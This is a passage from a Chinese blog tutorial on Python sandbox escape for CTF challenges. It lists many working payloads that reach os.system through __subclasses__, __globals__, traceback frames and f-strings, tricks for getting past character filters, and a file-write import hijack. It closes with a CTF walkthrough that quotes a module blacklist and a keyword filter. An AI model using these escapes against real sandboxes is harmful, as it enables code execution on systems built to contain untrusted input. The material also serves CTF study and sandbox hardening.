<code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>''.split</code> 等等。</p><p>那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;NameError: name 'os' is not defined&gt;&gt;&gt; os = reload(site.os)&gt;&gt;&gt; os.system('whoami')macr0phag30PYTHON-REPL</code></pre><p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i...(0, &lt;type 'type'&gt;)(1, &lt;type 'weakref'&gt;)(2, &lt;type 'weakcallableproxy'&gt;)(3, &lt;type 'weakproxy'&gt;)(4, &lt;type 'int'&gt;)(5, &lt;type 'basestring'&gt;)(6, &lt;type 'bytearray'&gt;)(7, &lt;type 'list'&gt;)(8, &lt;type 'NoneType'&gt;)(9, &lt;type 'NotImplementedType'&gt;)(10, &lt;type 'traceback'&gt;)(11, &lt;type 'super'&gt;)(12, &lt;type 'xrange'&gt;)(13, &lt;type 'dict'&gt;)(14, &lt;type 'set'&gt;)(15, &lt;type 'slice'&gt;)(16, &lt;type 'staticmethod'&gt;)(17, &lt;type 'complex'&gt;)(18, &lt;type 'float'&gt;)(19, &lt;type 'buffer'&gt;)(20, &lt;type 'long'&gt;)(21, &lt;type 'frozenset'&gt;)(22, &lt;type 'property'&gt;)(23, &lt;type 'memoryview'&gt;)(24, &lt;type 'tuple'&gt;)(25, &lt;type 'enumerate'&gt;)(26, &lt;type 'reversed'&gt;)(27, &lt;type 'code'&gt;)(28, &lt;type 'frame'&gt;)(29, &lt;type 'builtin_function_or_method'&gt;)(30, &lt;type 'instancemethod'&gt;)(31, &lt;type 'function'&gt;)(32, &lt;type 'classobj'&gt;)(33, &lt;type 'dictproxy'&gt;)(34, &lt;type 'generator'&gt;)(35, &lt;type 'getset_descriptor'&gt;)(36, &lt;type 'wrapper_descriptor'&gt;)(37, &lt;type 'instance'&gt;)(38, &lt;type 'ellipsis'&gt;)(39, &lt;type 'member_descriptor'&gt;)(40, &lt;type 'file'&gt;)(41, &lt;type 'PyCapsule'&gt;)(42, &lt;type 'cell'&gt;)(43, &lt;type 'callable-iterator'&gt;)(44, &lt;type 'iterator'&gt;)(45, &lt;type 'sys.long_info'&gt;)(46, &lt;type 'sys.float_info'&gt;)(47, &lt;type 'EncodingMap'&gt;)(48, &lt;type 'fieldnameiterator'&gt;)(49, &lt;type 'formatteriterator'&gt;)(50, &lt;type 'sys.version_info'&gt;)(51, &lt;type 'sys.flags'&gt;)(52, &lt;type 'exceptions.BaseException'&gt;)(53, &lt;type 'module'&gt;)(54, &lt;type 'imp.NullImporter'&gt;)(55, &lt;type 'zipimport.zipimporter'&gt;)(56, &lt;type 'posix.stat_result'&gt;)(57, &lt;type 'posix.statvfs_result'&gt;)(58, &lt;class 'warnings.WarningMessage'&gt;)(59, &lt;class 'warnings.catch_warnings'&gt;)(60, &lt;class '_weakrefset._IterationGuard'&gt;)(61, &lt;class '_weakrefset.WeakSet'&gt;)(62, &lt;class '_abcoll.Hashable'&gt;)(63, &lt;type 'classmethod'&gt;)(64, &lt;class '_abcoll.Iterable'&gt;)(65, &lt;class '_abcoll.Sized'&gt;)(66, &lt;class '_abcoll.Container'&gt;)(67, &lt;class '_abcoll.Callable'&gt;)(68, &lt;type 'dict_keys'&gt;)(69, &lt;type 'dict_items'&gt;)(70, &lt;type 'dict_values'&gt;)(71, &lt;class 'site._Printer'&gt;)(72, &lt;class 'site._Helper'&gt;)(73, &lt;type '_sre.SRE_Pattern'&gt;)(74, &lt;type '_sre.SRE_Match'&gt;)(75, &lt;type '_sre.SRE_Scanner'&gt;)(76, &lt;class 'site.Quitter'&gt;)(77, &lt;class 'codecs.IncrementalEncoder'&gt;)(78, &lt;class 'codecs.IncrementalDecoder'&gt;)PYTHON</code></pre><p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>os</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PROLOG</code></pre><p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p><p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import warnings&gt;&gt;&gt; &gt;&gt;&gt; warnings.osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;AttributeError: 'module' object has no attribute 'os'&gt;&gt;&gt; &gt;&gt;&gt; warnings.linecache&lt;module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'&gt;&gt;&gt;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PYTHON</code></pre><p>在继承链中就可以这样（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>linecache</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]PROLOG</code></pre><p> 顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p><pre class="language-none"><code class="language-none"> def __init__(self, record=False, module=None):... self._module = sys.modules['warnings'] if module is None else module...OXYGENE</code></pre><p>所以通过<code>_module</code>也可以构造 payload（py3.x 中已经移除了 <code>catch_warnings</code> 的 <code>linecache</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')macr0phag30STYLUS</code></pre><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami')PROLOG</code></pre><p>当然这样也是可以的（3.x）：</p><pre class="language-none"><code class="language-none">set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：</p><pre class="language-none"><code class="language-none">object.__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><pre class="language-none"><code class="language-none">"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')SQF</code></pre><p> 或者简单一点：</p><pre class="language-none"><code class="language-none">[].pop.__class__.__call__(eval, '1+1')STYLUS</code></pre><p>上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 <strong>name</strong> 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。</p><p>最后再补充几个。</p><p>可以这样利用：</p><pre class="language-none"><code class="language-none">class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, '1+1')) # 如果是 3.x 的话可以简写为： # super().keys.__class__.__call__(eval, '1+1'))test()SCSS</code></pre><p>还可以利用异常逃逸：</p><pre class="language-none"><code class="language-none">hack = lambda : [0][1]try: hack()except Exception as e: e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')PYTHON</code></pre><p>还可以利用 <code>format</code>：</p><ol><li><code>"{0.__class__.__base__}".format([])</code></li><li><code>"{x.__class__.__base__}".format(x=[])</code></li><li><code>"{.__class__.__base__}".format([])</code></li><li><code>("{0.__class_"+"_.__base__}").format([])</code></li></ol><p>（这里顺手记录下，对于字典键是整数型的比如 <code>{"1":2}</code>，format 是无法拿到值的 :)，这样会报错：<code>''' {0['1']} '''.format({"1":2})</code>，<code>'1'</code> 引号去掉的话又会报没有这个键，这个特性可以见<a href="https://docs.python.org/3/library/string.html#format-string-syntax">文档</a>）</p><p>上面的这些利用方式总结起来就是通过 <code>.mro()</code>、<code>__class__</code>、<code>type(...)</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__base__</code>、<code>__bases__</code> 等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p><p>最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 <code>jinja2</code>，这类属于 <code>SSTI</code> 漏洞，可以看这篇博客：<a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">传送门🚪</a>，这里就不多说了。</p><p>其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。</p><h1 id="文件读写沙箱逃逸"><a href="#文件读写沙箱逃逸" class="headerlink" title="文件读写沙箱逃逸"></a><strong>文件读写</strong>沙箱逃逸</h1><p>2.x 有个内建的 <code>file</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; file('key').read()'Macr0phag3\n'&gt;&gt;&gt; file('key', 'w').write('Macr0phag3')&gt;&gt;&gt; file('key').read()'Macr0phag3'DELPHI</code></pre><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来： math.py：</p><pre class="language-none"><code class="language-none">import osprint(os.system('whoami'))MOONSCRIPT</code></pre><p> 调用</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import mathmacr0phag30PYTHON-REPL</code></pre><p> 这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; 're' in sys.modulesTrue&gt;&gt;&gt; 'math' in sys.modulesFalse&gt;&gt;&gt;PYTHON-REPL</code></pre><p> 当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>读文件暂时没什么发现特别的地方。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.open('key').read()'Macr0phag3\n'LIVECODESERVER</code></pre><p> 或者</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]('key').read()'Macr0phag3'GCODE</code></pre><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a><strong>敏感信息泄露</strong></h1><p>这个也算只能读吧。</p><ol><li><code>dir()</code></li><li><code>__import__("__main__").x</code>，其中 <strong>main</strong> 还会泄露脚本的绝对路径：<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li><li><code>__file__</code>，文件绝对路径</li><li><code>x.__dict__</code></li><li><code>locals()</code></li><li><code>globals()</code></li><li><code>vars()</code></li><li><code>sys._getframe(0).f_code.co_varnames</code></li><li><code>sys._getframe(0).f_locals</code></li><li><code>inspect.x</code>，inspect 有很多方法可以获取信息，比如获取源码可以用 <code>inspect.getsource</code>，还有其他很多的功能</li><li>…</li></ol><p>这有一篇不错的文章，推荐阅读：</p><p><a href="https://www.cnblogs.com/dechinphy/p/modify-locals.html">https://www.cnblogs.com/dechinphy/p/modify-locals.html</a></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h1><p>这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 [ ]"></a><strong>过滤 [ ]</strong></h3><p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()'macr0phag3\n'STYLUS</code></pre><p>当然，dict 也是可以 pop 的：<code>{"a": 1}.pop("a")</code></p><p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 <code>max</code> 之类的玩意。</p><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h3><blockquote><p>chr</p></blockquote><p>最简单就是用 <code>chr</code> 啦</p><pre class="language-none"><code class="language-none">os.system( chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))SCSS</code></pre><blockquote><p>扣字符</p></blockquote><p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</p><pre class="language-none"><code class="language-none">os.system( str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(()a)[10]+str(().__class__.__new__)[3])SCSS</code></pre><p> 当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p><p>如果 str 被过滤了怎么办呢？<code>type('')()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p><blockquote><p>格式化字符串</p></blockquote><p>那过滤了引号，格式化字符串还能用吗？</p><p><code>(chr(37)+str({}.__class__)[1])%100 == 'd'</code></p><p>又起飞了…</p><blockquote><p>dict() 拿键它不香吗？</p><pre class="language-none"><code class="language-none">'whoami' ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] ==aPYTHON</code></pre></blockquote><h3 id="限制数字"><a href="#限制数字" class="headerlink" title="限制数字"></a><strong>限制数字</strong></h3><p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p><ol><li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li><li>1：<code>int(bool([""]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li><li>获取稍微大的数字：<code>len(str({}.keys))</code>，不过需要慢慢找长度符合的字符串</li><li>1.0：<code>float(True)</code></li><li>-1：<code>~0</code></li><li>…</li></ol><p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p><pre class="language-none"><code class="language-none">0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4...PYTHON</code></pre><p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p><h3 id="限制空格"><a href="#限制空格" class="headerlink" title="限制空格"></a><strong>限制空格</strong></h3><p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p><p><code>[i for i in range(10) if i == 5]</code> 可以替换为 <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p><h3 id="限制运算符"><a href="#限制运算符" class="headerlink" title="限制运算符"></a><strong>限制运算符</strong></h3><blockquote><p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p></blockquote><p><code>==</code> 可以用 <code>in</code> 来替换。</p><p>替换 <code>or</code> 的测试代码</p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] or i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans) print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)PY</code></pre><p> 上面这几个表达式都可以替换掉 <code>or</code></p><p>替换 <code>and</code> 的测试代码</p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] and i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} &amp; {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)PY</code></pre><p> 上面这几个表达式都可以替换掉 <code>and</code></p><h3 id="限制"><a href="#限制" class="headerlink" title="限制 ( )"></a><strong>限制 ( )</strong></h3><p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p><ul><li>利用装饰器 <code>@</code></li><li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code>，</li></ul><p>利用这两种姿势，我在《OrangeKiller CTF 第 2 期》中出了 2 道题目，题解篇写的很详细，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p><h3 id="利用新特性"><a href="#利用新特性" class="headerlink" title="利用新特性"></a><strong>利用新特性</strong></h3><p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门🚪</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门🚪</a>。所以我们就有了一种船新的利用方式：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; f'{__import__("os").system("whoami")}'macr0phag3'0'PYTHON</code></pre><p> 关注每次版本增加的新特性，或许能淘到点宝贝。</p><h3 id="利用反序列化攻击"><a href="#利用反序列化攻击" class="headerlink" title="利用反序列化攻击"></a><strong>利用反</strong>序列化<strong>攻击</strong></h3><p>反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，见这篇文章，见：<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">传送门🚪</a></p><h2 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a><strong>🌰</strong></h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python2</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">def</span> <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span> <span class="token string">"============================================="</span> <span class="token keyword">print</span> <span class="token string">" Simple calculator implemented by python "</span> <span class="token keyword">print</span> <span class="token string">"============================================="</span> <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">getexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"&gt;&gt;&gt; "</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_hook_import_</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span> module_blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'bdb'</span><span class="token punctuation">,</span> <span class="token string">'bsddb'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span> <span class="token string">'CGIHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'cgitb'</span><span class="token punctuation">,</span> <span class="token string">'compileall'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'dircache'</span><span class="token punctuation">,</span> <span class="token string">'doctest'</span><span class="token punctuation">,</span> <span class="token string">'dumbdbm'</span><span class="token punctuation">,</span> <span class="token string">'filecmp'</span><span class="token punctuation">,</span> <span class="token string">'fileinput'</span><span class="token punctuation">,</span> <span class="token string">'ftplib'</span><span class="token punctuation">,</span> <span class="token string">'gzip'</span><span class="token punctuation">,</span> <span class="token string">'getopt'</span><span class="token punctuation">,</span> <span class="token string">'getpass'</span><span class="token punctuation">,</span> <span class="token string">'gettext'</span><span class="token punctuation">,</span> <span class="token string">'httplib'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'imputil'</span><span class="token punctuation">,</span> <span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'macpath'</span><span class="token punctuation">,</span> <span class="token string">'mailbox'</span><span class="token punctuation">,</span> <span class="token string">'mailcap'</span><span class="token punctuation">,</span> <span class="token string">'mhlib'</span><span class="token punctuation">,</span> <span class="token string">'mimetools'</span><span class="token punctuation">,</span> <span class="token string">'mimetypes'</span><span class="token punctuation">,</span> <span class="token string">'modulefinder'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'netrc'</span><span class="token punctuation">,</span> <span class="token string">'new'</span><span class="token punctuation">,</span> <span class="token string">'optparse'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'pipes'</span><span class="token punctuation">,</span> <span class="token string">'pkgutil'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'popen2'</span><span class="token punctuation">,</span> <span class="token string">'poplib'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'posixfile'</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token string">'pstats'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'py_compile'</span><span class="token punctuation">,</span> <span class="token string">'pyclbr'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span> <span class="token string">'rexec'</span><span class="token punctuation">,</span> <span class="token string">'runpy'</span><span class="token punctuation">,</span> <span class="token string">'shlex'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'SimpleHTTPServer'</span><span class="token punctuation">,</span> <span class="token string">'SimpleXMLRPCServer'</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">,</span> <span class="token string">'smtpd'</span><span class="token punctuation">,</span> <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'SocketServer'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'sysconfig'</span><span class="token punctuation">,</span> <span class="token string">'tabnanny'</span><span class="token punctuation">,</span> <span class="token string">'tarfile'</span><span class="token punctuation">,</span> <span class="token string">'telnetlib'</span><span class="token punctuation">,</span> <span class="token string">'tempfile'</span><span class="token punctuation">,</span> <span class="token string">'Tix'</span><span class="token punctuation">,</span> <span class="token string">'trace'</span><span class="token punctuation">,</span> <span class="token string">'turtle'</span><span class="token punctuation">,</span> <span class="token string">'urllib'</span><span class="token punctuation">,</span> <span class="token string">'urllib2'</span><span class="token punctuation">,</span> <span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token string">'uu'</span><span class="token punctuation">,</span> <span class="token string">'webbrowser'</span><span class="token punctuation">,</span> <span class="token string">'whichdb'</span><span class="token punctuation">,</span> <span class="token string">'zipfile'</span><span class="token punctuation">,</span> <span class="token string">'zipimport'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> forbid <span class="token keyword">in</span> module_blacklist<span class="token punctuation">:</span> <span class="token keyword">if</span> name <span class="token operator">==</span> forbid<span class="token punctuation">:</span> <span class="token comment"># don't let user import these modules</span> <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'No you can\' import {0}!!!'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>forbid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># normal modules can be imported</span> <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox_filter</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__setitem__'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> forbid <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span> <span class="token keyword">if</span> forbid <span class="token keyword">in</span> command<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">0</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">sandbox_exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># sandbox user input</span> result <span class="token operator">=</span> <span class="token number">0</span> __sandboxed_builtins__ <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span> __sandboxed_builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _hook_import_ <span class="token comment"># hook import</span> <span class="token keyword">del</span> __sandboxed_builtins__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span> _global <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> __sandboxed_builtins__ <span class="token punctuation">}</span> <span class="token keyword">if</span> sandbox_filter<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">print</span> <span class="token string">'Malicious user input detected!!!'</span> exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> command <span class="token operator">=</span> <span class="token string">'result = '</span> <span class="token operator">+</span> command <span class="token keyword">try</span><span class="token punctuation">:</span> <span class="token keyword">exec</span> command <span class="token keyword">in</span> _global <span class="token comment"># do calculate in a sandboxed environment</span> <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span> <span class="token keyword">print</span> e <span class="token keyword">return</span> <span class="token number">0</span> result <span class="token operator">=</span> _global<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token comment"># extract the result</span> <span class="token keyword">return</span> resultbanner<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span> command <span class="token operator">=</span> getexp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span> sandbox_exec<span class="token punctuation">(</span>command<span class="token punctuation">)</span>PYTHON</code></pre><p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">传送门🚪</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__restricted attribute&gt;&gt;&gt; getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()file() constructor not accessible in restricted modeDELPHI</code></pre><p> 不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')macr0phag3LISP</code></pre><h3 id="极端限制"><a href="#极端限制" class="headerlink" title="极端限制"></a><strong>极端限制</strong></h3><p>这种限制一般是组合形式出现，而且通常只会出现在 CTF 